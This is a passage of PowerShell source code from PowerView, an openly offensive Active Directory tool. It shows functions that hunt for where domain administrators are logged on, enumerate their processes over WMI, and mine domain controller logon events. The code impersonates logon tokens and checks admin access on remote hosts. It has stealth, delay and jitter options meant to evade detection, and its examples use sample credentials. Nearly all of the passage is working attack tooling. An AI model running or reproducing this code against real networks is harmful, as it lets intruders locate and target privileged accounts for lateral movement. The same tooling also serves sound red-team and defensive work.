($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }\n            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }\n            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName\n        }\n\n        Write-Verbose \"[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)\"\n        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {\n            throw '[Find-DomainUserLocation] No users found to target'\n        }\n\n        # the host enumeration block we're using to enumerate all servers\n        $HostEnumBlock = {\n            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)\n\n            if ($TokenHandle) {\n                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation\n                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet\n            }\n\n            ForEach ($TargetComputer in $ComputerName) {\n                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer\n                if ($Up) {\n                    $Sessions = Get-NetSession -ComputerName $TargetComputer\n                    ForEach ($Session in $Sessions) {\n                        $UserName = $Session.UserName\n                        $CName = $Session.CName\n\n                        if ($CName -and $CName.StartsWith('\\\\')) {\n                            $CName = $CName.TrimStart('\\')\n                        }\n\n                        # make sure we have a result, and ignore computer$ sessions\n                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\\$$')) {\n\n                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {\n                                $UserLocation = New-Object PSObject\n                                $UserLocation | Add-Member Noteproperty 'UserDomain' $Null\n                                $UserLocation | Add-Member Noteproperty 'UserName' $UserName\n                                $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer\n                                $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName\n\n                                # try to resolve the DNS hostname of $Cname\n                                try {\n                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName\n                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName\n                                }\n                                catch {\n                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null\n                                }\n\n                                # see if we're checking to see if we have local admin access on this machine\n                                if ($CheckAccess) {\n                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin\n                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin\n                                }\n                                else {\n                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null\n                                }\n                                $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')\n                                $UserLocation\n                            }\n                        }\n                    }\n                    if (-not $Stealth) {\n                        # if we're not 'stealthy', enumerate loggedon users as well\n                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer\n                        ForEach ($User in $LoggedOn) {\n                            $UserName = $User.UserName\n                            $UserDomain = $User.LogonDomain\n\n                            # make sure wet have a result\n                            if (($UserName) -and ($UserName.trim() -ne '')) {\n                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\\$$')) {\n                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress\n                                    $UserLocation = New-Object PSObject\n                                    $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain\n                                    $UserLocation | Add-Member Noteproperty 'UserName' $UserName\n                                    $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer\n                                    $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress\n                                    $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null\n                                    $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null\n\n                                    # see if we're checking to see if we have local admin access on this machine\n                                    if ($CheckAccess) {\n                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer\n                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin\n                                    }\n                                    else {\n                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null\n                                    }\n                                    $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')\n                                    $UserLocation\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n\n            if ($TokenHandle) {\n                Invoke-RevertToSelf\n            }\n        }\n\n        $LogonToken = $Null\n        if ($PSBoundParameters['Credential']) {\n            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential\n            }\n            else {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet\n            }\n        }\n    }\n\n    PROCESS {\n        # only ignore threading if -Delay is passed\n        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n\n            Write-Verbose \"[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)\"\n            Write-Verbose \"[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter\"\n            $Counter = 0\n            $RandNo = New-Object System.Random\n\n            ForEach ($TargetComputer in $TargetComputers) {\n                $Counter = $Counter + 1\n\n                # sleep for our semi-randomized interval\n                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)\n\n                Write-Verbose \"[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))\"\n                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken\n\n                if ($Result -and $StopOnSuccess) {\n                    Write-Verbose \"[Find-DomainUserLocation] Target user found, returning early\"\n                    return\n                }\n            }\n        }\n        else {\n            Write-Verbose \"[Find-DomainUserLocation] Using threading with threads: $Threads\"\n            Write-Verbose \"[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)\"\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction\n            $ScriptParams = @{\n                'TargetUsers' = $TargetUsers\n                'CurrentUser' = $CurrentUser\n                'Stealth' = $Stealth\n                'TokenHandle' = $LogonToken\n            }\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params\n            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Find-DomainProcess {\n<#\n.SYNOPSIS\n\nSearches for processes on the domain using WMI, returning processes\nthat match a particular user specification or process name.\n\nThanks to @paulbrandau for the approach idea.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, New-ThreadedFunction  \n\n.DESCRIPTION\n\nThis function enumerates all machines on the current (or specified) domain\nusing Get-DomainComputer, and queries the domain for users of a specified group\n(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the\nfunction enumerates any current processes running with Get-WMIProcess,\nsearching for processes running under any target user contexts or with the\nspecified -ProcessName. If -Credential is passed, it is passed through to\nthe underlying WMI commands used to enumerate the remote machines.\n\n.PARAMETER ComputerName\n\nSpecifies an array of one or more hosts to enumerate, passable on the pipeline.\nIf -ComputerName is not passed, the default behavior is to enumerate all machines\nin the domain returned by Get-DomainComputer.\n\n.PARAMETER Domain\n\nSpecifies the domain to query for computers AND users, defaults to the current domain.\n\n.PARAMETER ComputerDomain\n\nSpecifies the domain to query for computers, defaults to the current domain.\n\n.PARAMETER ComputerLDAPFilter\n\nSpecifies an LDAP query string that is used to search for computer objects.\n\n.PARAMETER ComputerSearchBase\n\nSpecifies the LDAP source to search through for computers,\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER ComputerUnconstrained\n\nSwitch. Search computer objects that have unconstrained delegation.\n\n.PARAMETER ComputerOperatingSystem\n\nSearch computers with a specific operating system, wildcards accepted.\n\n.PARAMETER ComputerServicePack\n\nSearch computers with a specific service pack, wildcards accepted.\n\n.PARAMETER ComputerSiteName\n\nSearch computers in the specific AD Site name, wildcards accepted.\n\n.PARAMETER ProcessName\n\nSearch for processes with one or more specific names.\n\n.PARAMETER UserIdentity\n\nSpecifies one or more user identities to search for.\n\n.PARAMETER UserDomain\n\nSpecifies the domain to query for users to search for, defaults to the current domain.\n\n.PARAMETER UserLDAPFilter\n\nSpecifies an LDAP query string that is used to search for target users.\n\n.PARAMETER UserSearchBase\n\nSpecifies the LDAP source to search through for target users.\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER UserGroupIdentity\n\nSpecifies a group identity to query for target users, defaults to 'Domain Admins.\nIf any other user specifications are set, then UserGroupIdentity is ignored.\n\n.PARAMETER UserAdminCount\n\nSwitch. Search for users users with '(adminCount=1)' (meaning are/were privileged).\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain and target systems.\n\n.PARAMETER StopOnSuccess\n\nSwitch. Stop hunting after finding after finding a target user.\n\n.PARAMETER Delay\n\nSpecifies the delay (in seconds) between enumerating hosts, defaults to 0.\n\n.PARAMETER Jitter\n\nSpecifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3\n\n.PARAMETER Threads\n\nThe number of threads to use for user searching, defaults to 20.\n\n.EXAMPLE\n\nFind-DomainProcess\n\nSearches for processes run by 'Domain Admins' by enumerating every computer in the domain.\n\n.EXAMPLE\n\nFind-DomainProcess -UserAdminCount -ComputerOperatingSystem 'Windows 7*' -Domain dev.testlab.local\n\nEnumerates Windows 7 computers in dev.testlab.local and returns any processes being run by\nprivileged users in dev.testlab.local.\n\n.EXAMPLE\n\nFind-DomainProcess -ProcessName putty.exe\n\nSearchings for instances of putty.exe running on the current domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nFind-DomainProcess -Domain testlab.local -Credential $Cred\n\nSearches processes being run by 'domain admins' in the testlab.local using the specified alternate credentials.\n\n.OUTPUTS\n\nPowerView.UserProcess\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]\n    [OutputType('PowerView.UserProcess')]\n    [CmdletBinding(DefaultParameterSetName = 'None')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DNSHostName')]\n        [String[]]\n        $ComputerName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerLDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerSearchBase,\n\n        [Alias('Unconstrained')]\n        [Switch]\n        $ComputerUnconstrained,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('OperatingSystem')]\n        [String]\n        $ComputerOperatingSystem,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ServicePack')]\n        [String]\n        $ComputerServicePack,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('SiteName')]\n        [String]\n        $ComputerSiteName,\n\n        [Parameter(ParameterSetName = 'TargetProcess')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ProcessName,\n\n        [Parameter(ParameterSetName = 'TargetUser')]\n        [Parameter(ParameterSetName = 'UserIdentity')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $UserIdentity,\n\n        [Parameter(ParameterSetName = 'TargetUser')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $UserDomain,\n\n        [Parameter(ParameterSetName = 'TargetUser')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $UserLDAPFilter,\n\n        [Parameter(ParameterSetName = 'TargetUser')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $UserSearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('GroupName', 'Group')]\n        [String[]]\n        $UserGroupIdentity = 'Domain Admins',\n\n        [Parameter(ParameterSetName = 'TargetUser')]\n        [Alias('AdminCount')]\n        [Switch]\n        $UserAdminCount,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $StopOnSuccess,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $Delay = 0,\n\n        [ValidateRange(0.0, 1.0)]\n        [Double]\n        $Jitter = .3,\n\n        [Int]\n        [ValidateRange(1, 100)]\n        $Threads = 20\n    )\n\n    BEGIN {\n        $ComputerSearcherArguments = @{\n            'Properties' = 'dnshostname'\n        }\n        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }\n        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }\n        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }\n        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }\n        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }\n        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }\n        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }\n        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }\n\n        $UserSearcherArguments = @{\n            'Properties' = 'samaccountname'\n        }\n        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }\n        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }\n        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }\n        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }\n        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }\n        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }\n\n\n        # first, build the set of computers to enumerate\n        if ($PSBoundParameters['ComputerName']) {\n            $TargetComputers = $ComputerName\n        }\n        else {\n            Write-Verbose '[Find-DomainProcess] Querying computers in the domain'\n            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname\n        }\n        Write-Verbose \"[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length)\"\n        if ($TargetComputers.Length -eq 0) {\n            throw '[Find-DomainProcess] No hosts found to enumerate'\n        }\n\n        # now build the user target set\n        if ($PSBoundParameters['ProcessName']) {\n            $TargetProcessName = @()\n            ForEach ($T in $ProcessName) {\n                $TargetProcessName += $T.Split(',')\n            }\n            if ($TargetProcessName -isnot [System.Array]) {\n                $TargetProcessName = [String[]] @($TargetProcessName)\n            }\n        }\n        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {\n            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname\n        }\n        else {\n            $GroupSearcherArguments = @{\n                'Identity' = $UserGroupIdentity\n                'Recurse' = $True\n            }\n            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }\n            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }\n            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }\n            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }\n            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }\n            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }\n            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }\n            $GroupSearcherArguments\n            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName\n        }\n\n        # the host enumeration block we're using to enumerate all servers\n        $HostEnumBlock = {\n            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)\n\n            ForEach ($TargetComputer in $ComputerName) {\n                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer\n                if ($Up) {\n                    # try to enumerate all active processes on the remote host\n                    # and search for a specific process name\n                    if ($Credential) {\n                        $Processes = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue\n                    }\n                    else {\n                        $Processes = Get-WMIProcess -ComputerName $TargetComputer -ErrorAction SilentlyContinue\n                    }\n                    ForEach ($Process in $Processes) {\n                        # if we're hunting for a process name or comma-separated names\n                        if ($ProcessName) {\n                            if ($ProcessName -Contains $Process.ProcessName) {\n                                $Process\n                            }\n                        }\n                        # if the session user is in the target list, display some output\n                        elseif ($TargetUsers -Contains $Process.User) {\n                            $Process\n                        }\n                    }\n                }\n            }\n        }\n    }\n\n    PROCESS {\n        # only ignore threading if -Delay is passed\n        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n\n            Write-Verbose \"[Find-DomainProcess] Total number of hosts: $($TargetComputers.count)\"\n            Write-Verbose \"[Find-DomainProcess] Delay: $Delay, Jitter: $Jitter\"\n            $Counter = 0\n            $RandNo = New-Object System.Random\n\n            ForEach ($TargetComputer in $TargetComputers) {\n                $Counter = $Counter + 1\n\n                # sleep for our semi-randomized interval\n                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)\n\n                Write-Verbose \"[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))\"\n                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential\n                $Result\n\n                if ($Result -and $StopOnSuccess) {\n                    Write-Verbose \"[Find-DomainProcess] Target user found, returning early\"\n                    return\n                }\n            }\n        }\n        else {\n            Write-Verbose \"[Find-DomainProcess] Using threading with threads: $Threads\"\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction\n            $ScriptParams = @{\n                'ProcessName' = $TargetProcessName\n                'TargetUsers' = $TargetUsers\n                'Credential' = $Credential\n            }\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params\n            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads\n        }\n    }\n}\n\n\nfunction Find-DomainUserEvent {\n<#\n.SYNOPSIS\n\nFinds logon events on the current (or remote domain) for the specified users.\n\nAuthor: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainUser, Get-DomainGroupMember, Get-DomainController, Get-DomainUserEvent, New-ThreadedFunction  \n\n.DESCRIPTION\n\nEnumerates all domain controllers from the specified -Domain\n(default of the local domain) using Get-DomainController, enumerates\nthe logon events for each using Get-DomainUserEvent, and filters\nthe results based on the targeting criteria.\n\n.PARAMETER ComputerName\n\nSpecifies an explicit computer name to retrieve events from.\n\n.PARAMETER Domain\n\nSpecifies a domain to query for domain controllers to enumerate.\nDefaults to the current domain.\n\n.PARAMETER Filter\n\nA hashtable of PowerView.LogonEvent properties to filter for.\nThe 'op|operator|operation' clause can have '&', '|', 'and', or 'or',\nand is 'or' by default, meaning at least one clause matches instead of all.\nSee the exaples for usage.\n\n.PARAMETER StartTime\n\nThe [DateTime] object representing the start of when to collect events.\nDefault of [DateTime]::Now.AddDays(-1).\n\n.PARAMETER EndTime\n\nThe [DateTime] object representing the end of when to collect events.\nDefault of [DateTime]::Now.\n\n.PARAMETER MaxEvents\n\nThe maximum number of events (per host) to retrieve. Default of 5000.\n\n.PARAMETER UserIdentity\n\nSpecifies one or more user identities to search for.\n\n.PARAMETER UserDomain\n\nSpecifies the domain to query for users to search for, defaults to the current domain.\n\n.PARAMETER UserLDAPFilter\n\nSpecifies an LDAP query string that is used to search for target users.\n\n.PARAMETER UserSearchBase\n\nSpecifies the LDAP source to search through for target users.\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER UserGroupIdentity\n\nSpecifies a group identity to query for target users, defaults to 'Domain Admins.\nIf any other user specifications are set, then UserGroupIdentity is ignored.\n\n.PARAMETER UserAdminCount\n\nSwitch. Search for users users with '(adminCount=1)' (meaning are/were privileged).\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target computer(s).\n\n.PARAMETER StopOnSuccess\n\nSwitch. Stop hunting after finding after finding a target user.\n\n.PARAMETER Delay\n\nSpecifies the delay (in seconds) between enumerating hosts, defaults to 0.\n\n.PARAMETER Jitter\n\nSpecifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3\n\n.PARAMETER Threads\n\nThe number of threads to use for user searching, defaults to 20.\n\n.EXAMPLE\n\nFind-DomainUserEvent\n\nSearch for any user events matching domain admins on every DC in the current domain.\n\n.EXAMPLE\n\n$cred = Get-Credential dev\\administrator\nFind-DomainUserEvent -ComputerName 'secondary.dev.testlab.local' -UserIdentity 'john'\n\nSearch for any user events matching the user 'john' on the 'secondary.dev.testlab.local'\ndomain controller using the alternate credential\n\n.EXAMPLE\n\n'primary.testlab.local | Find-DomainUserEvent -Filter @{'IpAddress'='192.168.52.200|192.168.52.201'}\n\nFind user events on the primary.testlab.local system where the event matches\nthe IPAddress '192.168.52.200' or '192.168.52.201'.\n\n.EXAMPLE\n\n$cred = Get-Credential testlab\\administrator\nFind-DomainUserEvent -Delay 1 -Filter @{'LogonGuid'='b8458aa9-b36e-eaa1-96e0-4551000fdb19'; 'TargetLogonId' = '10238128'; 'op'='&'}\n\nFind user events mathing the specified GUID AND the specified TargetLogonId, searching\nthrough every domain controller in the current domain, enumerating each DC in serial\ninstead of in a threaded manner, using the alternate credential.\n\n.OUTPUTS\n\nPowerView.LogonEvent\n\nPowerView.ExplicitCredentialLogon\n\n.LINK\n\nhttp://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]\n    [OutputType('PowerView.LogonEvent')]\n    [OutputType('PowerView.ExplicitCredentialLogon')]\n    [CmdletBinding(DefaultParameterSetName = 'Domain')]\n    Param(\n        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('dnshostname', 'HostName', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName,\n\n        [Parameter(ParameterSetName = 'Domain')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Hashtable]\n        $Filter,\n\n        [Parameter(ValueFromPipelineByPropertyName = $True)]\n        [ValidateNotNullOrEmpty()]\n        [DateTime]\n        $StartTime = [DateTime]::Now.AddDays(-1),\n\n        [Parameter(ValueFromPipelineByPropertyName = $True)]\n        [ValidateNotNullOrEmpty()]\n        [DateTime]\n        $EndTime = [DateTime]::Now,\n\n        [ValidateRange(1, 1000000)]\n        [Int]\n        $MaxEvents = 5000,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $UserIdentity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $UserDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $UserLDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $UserSearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('GroupName', 'Group')]\n        [String[]]\n        $UserGroupIdentity = 'Domain Admins',\n\n        [Alias('AdminCount')]\n        [Switch]\n        $UserAdminCount,\n\n        [Switch]\n        $CheckAccess,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $StopOnSuccess,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $Delay = 0,\n\n        [ValidateRange(0.0, 1.0)]\n        [Double]\n        $Jitter = .3,\n\n        [Int]\n        [ValidateRange(1, 100)]\n        $Threads = 20\n    )\n\n    BEGIN {\n        $UserSearcherArguments = @{\n            'Properties' = 'samaccountname'\n        }\n        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }\n        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }\n        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }\n        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }\n        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }\n        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }\n\n        if ($PSBoundParameters['UserIdentity'] -or 